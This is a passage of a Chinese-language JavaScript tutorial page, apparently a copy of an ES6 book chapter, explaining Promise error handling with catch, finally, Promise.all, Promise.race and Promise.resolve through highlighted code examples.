class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getJSON(<span class="string">'/post/1.json'</span>).then(<span class="function"><span class="keyword">function</span>(<span class="params">post</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(post.commentURL);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params">comments</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// some code</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// 处理前面三个Promise产生的错误</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，一共有三个 Promise 对象：一个由<code>getJSON</code>产生，两个由<code>then</code>产生。它们之中任何一个抛出的错误，都会被最后一个<code>catch</code>捕获。</p><p>一般来说，不要在<code>then</code>方法里面定义 Reject 状态的回调函数（即<code>then</code>的第二个参数），总是使用<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bad</span></span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;, <span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// error</span></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// good</span></span><br><span class="line">promise</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123; <span class="comment">//cb</span></span><br><span class="line">    <span class="comment">// success</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .catch(<span class="function"><span class="keyword">function</span>(<span class="params">err</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// error</span></span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面<code>then</code>方法执行中的错误，也更接近同步的写法（<code>try/catch</code>）。因此，建议总是使用<code>catch</code>方法，而不使用<code>then</code>方法的第二个参数。</p><p>跟传统的<code>try/catch</code>代码块不同的是，如果没有使用<code>catch</code>方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someAsyncThing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 下面一行会报错，因为x没有声明</span></span><br><span class="line">    resolve(x + <span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">someAsyncThing().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'everything is great'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="built_in">console</span>.log(<span class="number">123</span>) &#125;, <span class="number">2000</span>);</span><br><span class="line"><span class="comment">// Uncaught (in promise) ReferenceError: x is not defined</span></span><br><span class="line"><span class="comment">// 123</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>someAsyncThing</code>函数产生的 Promise 对象，内部有语法错误。浏览器运行到这一行，会打印出错误提示<code>ReferenceError: x is not defined</code>，但是不会退出进程、终止脚本执行，2 秒之后还是会输出<code>123</code>。这就是说，Promise 内部的错误不会影响到 Promise 外部的代码，通俗的说法就是“Promise 会吃掉错误”。</p><p>这个脚本放在服务器执行，退出码就是<code>0</code>（即表示执行成功）。不过，Node 有一个<code>unhandledRejection</code>事件，专门监听未捕获的<code>reject</code>错误，上面的脚本会触发这个事件的监听函数，可以在监听函数里面抛出错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">process.on(<span class="string">'unhandledRejection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err, p</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">throw</span> err;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>unhandledRejection</code>事件的监听函数有两个参数，第一个是错误对象，第二个是报错的 Promise 实例，它可以用来了解发生错误的环境信息。</p><p>注意，Node 有计划在未来废除<code>unhandledRejection</code>事件。如果 Promise 内部有未捕获的错误，会直接终止进程，并且进程的退出码不为 0。</p><p>再看下面的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">  resolve(<span class="string">'ok'</span>);</span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'test'</span>) &#125;, <span class="number">0</span>)</span><br><span class="line">&#125;);</span><br><span class="line">promise.then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123; <span class="built_in">console</span>.log(value) &#125;);</span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line"><span class="comment">// Uncaught Error: test</span></span><br></pre></td></tr></table></figure><p>上面代码中，Promise 指定在下一轮“事件循环”再抛出错误。到了那个时候，Promise 的运行已经结束了，所以这个错误是在 Promise 函数体外抛出的，会冒泡到最外层，成了未捕获的错误。</p><p>一般总是建议，Promise 对象后面要跟<code>catch</code>方法，这样可以处理 Promise 内部发生的错误。<code>catch</code>方法返回的还是一个 Promise 对象，因此后面还可以接着调用<code>then</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someAsyncThing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 下面一行会报错，因为x没有声明</span></span><br><span class="line">    resolve(x + <span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">someAsyncThing()</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// oh no [ReferenceError: x is not defined]</span></span><br><span class="line"><span class="comment">// carry on</span></span><br></pre></td></tr></table></figure><p>上面代码运行完<code>catch</code>方法指定的回调函数，会接着运行后面那个<code>then</code>方法指定的回调函数。如果没有报错，则会跳过<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve()</span><br><span class="line">.catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// carry on</span></span><br></pre></td></tr></table></figure><p>上面的代码因为没有报错，跳过了<code>catch</code>方法，直接执行后面的<code>then</code>方法。此时，要是<code>then</code>方法里面报错，就与前面的<code>catch</code>无关了。</p><p><code>catch</code>方法之中，还能再抛出错误。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> someAsyncThing = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 下面一行会报错，因为x没有声明</span></span><br><span class="line">    resolve(x + <span class="number">2</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">someAsyncThing().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> someOtherAsyncThing();</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">  <span class="comment">// 下面一行会报错，因为 y 没有声明</span></span><br><span class="line">  y + <span class="number">2</span>;</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// oh no [ReferenceError: x is not defined]</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>catch</code>方法抛出一个错误，因为后面没有别的<code>catch</code>方法了，导致这个错误不会被捕获，也不会传递到外层。如果改写一下，结果就不一样了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">someAsyncThing().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> someOtherAsyncThing();</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'oh no'</span>, error);</span><br><span class="line">  <span class="comment">// 下面一行会报错，因为y没有声明</span></span><br><span class="line">  y + <span class="number">2</span>;</span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'carry on'</span>, error);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// oh no [ReferenceError: x is not defined]</span></span><br><span class="line"><span class="comment">// carry on [ReferenceError: y is not defined]</span></span><br></pre></td></tr></table></figure><p>上面代码中，第二个<code>catch</code>方法用来捕获，前一个<code>catch</code>方法抛出的错误。</p><h2 id="Promise-prototype-finally"><a href="#Promise-prototype-finally" class="headerlink" title="Promise.prototype.finally()"></a>Promise.prototype.finally()</h2><p><code>finally</code>方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。该方法是 ES2018 引入标准的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">promise</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> &#123;···&#125;)</span><br><span class="line">.catch(<span class="function"><span class="params">error</span> =&gt;</span> &#123;···&#125;)</span><br><span class="line">.finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;···&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，不管<code>promise</code>最后的状态，在执行完<code>then</code>或<code>catch</code>指定的回调函数以后，都会执行<code>finally</code>方法指定的回调函数。</p><p>下面是一个例子，服务器使用 Promise 处理请求，然后使用<code>finally</code>方法关掉服务器。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server.listen(port)</span><br><span class="line">  .then(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;)</span><br><span class="line">  .finally(server.stop);</span><br></pre></td></tr></table></figure><p><code>finally</code>方法的回调函数不接受任何参数，这意味着没有办法知道，前面的 Promise 状态到底是<code>fulfilled</code>还是<code>rejected</code>。这表明，<code>finally</code>方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。</p><p><code>finally</code>本质上是<code>then</code>方法的特例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">promise</span><br><span class="line">.finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// 语句</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line">promise</span><br><span class="line">.then(</span><br><span class="line">  result =&gt; &#123;</span><br><span class="line">    <span class="comment">// 语句</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;,</span><br><span class="line">  error =&gt; &#123;</span><br><span class="line">    <span class="comment">// 语句</span></span><br><span class="line">    <span class="keyword">throw</span> error;</span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>上面代码中，如果不使用<code>finally</code>方法，同样的语句需要为成功和失败两种情况各写一次。有了<code>finally</code>方法，则只需要写一次。</p><p>它的实现也很简单。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.prototype.finally = <span class="function"><span class="keyword">function</span> (<span class="params">callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> P = <span class="keyword">this</span>.constructor;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.then(</span><br><span class="line">    value  =&gt; P.resolve(callback()).then(<span class="function"><span class="params">()</span> =&gt;</span> value),</span><br><span class="line">    reason =&gt; P.resolve(callback()).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123; <span class="keyword">throw</span> reason &#125;)</span><br><span class="line">  );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面代码中，不管前面的 Promise 是<code>fulfilled</code>还是<code>rejected</code>，都会执行回调函数<code>callback</code>。</p><p>从上面的实现还可以看到，<code>finally</code>方法总是会返回原来的值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// resolve 的值是 undefined</span></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="number">2</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, () =&gt; &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// resolve 的值是 2</span></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="number">2</span>).finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reject 的值是 undefined</span></span><br><span class="line"><span class="built_in">Promise</span>.reject(<span class="number">3</span>).then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;, () =&gt; &#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// reject 的值是 3</span></span><br><span class="line"><span class="built_in">Promise</span>.reject(<span class="number">3</span>).finally(<span class="function"><span class="params">()</span> =&gt;</span> &#123;&#125;)</span><br></pre></td></tr></table></figure><h2 id="Promise-all"><a href="#Promise-all" class="headerlink" title="Promise.all()"></a>Promise.all()</h2><p><code>Promise.all</code>方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.all([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>Promise.all</code>方法接受一个数组作为参数，<code>p1</code>、<code>p2</code>、<code>p3</code>都是 Promise 实例，如果不是，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为 Promise 实例，再进一步处理。（<code>Promise.all</code>方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）</p><p><code>p</code>的状态由<code>p1</code>、<code>p2</code>、<code>p3</code>决定，分成两种情况。</p><p>（1）只有<code>p1</code>、<code>p2</code>、<code>p3</code>的状态都变成<code>fulfilled</code>，<code>p</code>的状态才会变成<code>fulfilled</code>，此时<code>p1</code>、<code>p2</code>、<code>p3</code>的返回值组成一个数组，传递给<code>p</code>的回调函数。</p><p>（2）只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个被<code>rejected</code>，<code>p</code>的状态就变成<code>rejected</code>，此时第一个被<code>reject</code>的实例的返回值，会传递给<code>p</code>的回调函数。</p><p>下面是一个具体的例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 生成一个Promise对象的数组</span></span><br><span class="line"><span class="keyword">const</span> promises = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="number">13</span>].map(<span class="function"><span class="keyword">function</span> (<span class="params">id</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> getJSON(<span class="string">'/post/'</span> + id + <span class="string">".json"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all(promises).then(<span class="function"><span class="keyword">function</span> (<span class="params">posts</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;).catch(<span class="function"><span class="keyword">function</span>(<span class="params">reason</span>)</span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>上面代码中，<code>promises</code>是包含 6 个 Promise 实例的数组，只有这 6 个实例的状态都变成<code>fulfilled</code>，或者其中有一个变为<code>rejected</code>，才会调用<code>Promise.all</code>方法后面的回调函数。</p><p>下面是另一个例子。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> databasePromise = connectDatabase();</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> booksPromise = databasePromise</span><br><span class="line">  .then(findAllBooks);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userPromise = databasePromise</span><br><span class="line">  .then(getCurrentUser);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([</span><br><span class="line">  booksPromise,</span><br><span class="line">  userPromise</span><br><span class="line">])</span><br><span class="line">.then(<span class="function">(<span class="params">[books, user]</span>) =&gt;</span> pickTopRecommentations(books, user));</span><br></pre></td></tr></table></figure><p>上面代码中，<code>booksPromise</code>和<code>userPromise</code>是两个异步操作，只有等到它们的结果都返回了，才会触发<code>pickTopRecommentations</code>这个回调函数。</p><p>注意，如果作为参数的 Promise 实例，自己定义了<code>catch</code>方法，那么它一旦被<code>rejected</code>，并不会触发<code>Promise.all()</code>的<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">'hello'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错了'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result)</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> e);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// ["hello", Error: 报错了]</span></span><br></pre></td></tr></table></figure><p>上面代码中，<code>p1</code>会<code>resolved</code>，<code>p2</code>首先会<code>rejected</code>，但是<code>p2</code>有自己的<code>catch</code>方法，该方法返回的是一个新的 Promise 实例，<code>p2</code>指向的实际上是这个实例。该实例执行完<code>catch</code>方法后，也会变成<code>resolved</code>，导致<code>Promise.all()</code>方法参数里面的两个实例都会<code>resolved</code>，因此会调用<code>then</code>方法指定的回调函数，而不会调用<code>catch</code>方法指定的回调函数。</p><p>如果<code>p2</code>没有自己的<code>catch</code>方法，就会调用<code>Promise.all()</code>的<code>catch</code>方法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p1 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  resolve(<span class="string">'hello'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> p2 = <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'报错了'</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> result);</span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.all([p1, p2])</span><br><span class="line">.then(<span class="function"><span class="params">result</span> =&gt;</span> <span class="built_in">console</span>.log(result))</span><br><span class="line">.catch(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e));</span><br><span class="line"><span class="comment">// Error: 报错了</span></span><br></pre></td></tr></table></figure><h2 id="Promise-race"><a href="#Promise-race" class="headerlink" title="Promise.race()"></a>Promise.race()</h2><p><code>Promise.race</code>方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([p1, p2, p3]);</span><br></pre></td></tr></table></figure><p>上面代码中，只要<code>p1</code>、<code>p2</code>、<code>p3</code>之中有一个实例率先改变状态，<code>p</code>的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给<code>p</code>的回调函数。</p><p><code>Promise.race</code>方法的参数与<code>Promise.all</code>方法一样，如果不是 Promise 实例，就会先调用下面讲到的<code>Promise.resolve</code>方法，将参数转为 Promise 实例，再进一步处理。</p><p>下面是一个例子，如果指定时间内没有获得结果，就将 Promise 的状态变为<code>reject</code>，否则变为<code>resolve</code>。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> p = <span class="built_in">Promise</span>.race([</span><br><span class="line">  fetch(<span class="string">'/resource-that-may-take-a-while'</span>),</span><br><span class="line">  <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'request timeout'</span>)), <span class="number">5000</span>)</span><br><span class="line">  &#125;)</span><br><span class="line">]);</span><br><span class="line">p.then(<span class="function"><span class="params">response</span> =&gt;</span> <span class="built_in">console</span>.log(response));</span><br><span class="line">p.catch(<span class="function"><span class="params">error</span> =&gt;</span> <span class="built_in">console</span>.log(error));</span><br></pre></td></tr></table></figure><p>上面代码中，如果 5 秒之内<code>fetch</code>方法无法返回结果，变量<code>p</code>的状态就会变为<code>rejected</code>，从而触发<code>catch</code>方法指定的回调函数。</p><h2 id="Promise-resolve"><a href="#Promise-resolve" class="headerlink" title="Promise.resolve()"></a>Promise.resolve()</h2><p>有时需要将现有对象转为 Promise 对象，<code>Promise.resolve</code>方法就起到这个作用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jsPromise = <span class="built_in">Promise</span>.resolve($.ajax(<span class="string">'/whatever.json'</span>));</span><br></pre></td></tr></table></figure><p>上面代码将 jQuery 生成的<code>deferred</code>对象，转为一个新的 Promise 对象。</p><p><code>Promise.resolve</code>等价于下面的写法。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line"><span class="comment">// 等价于</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> 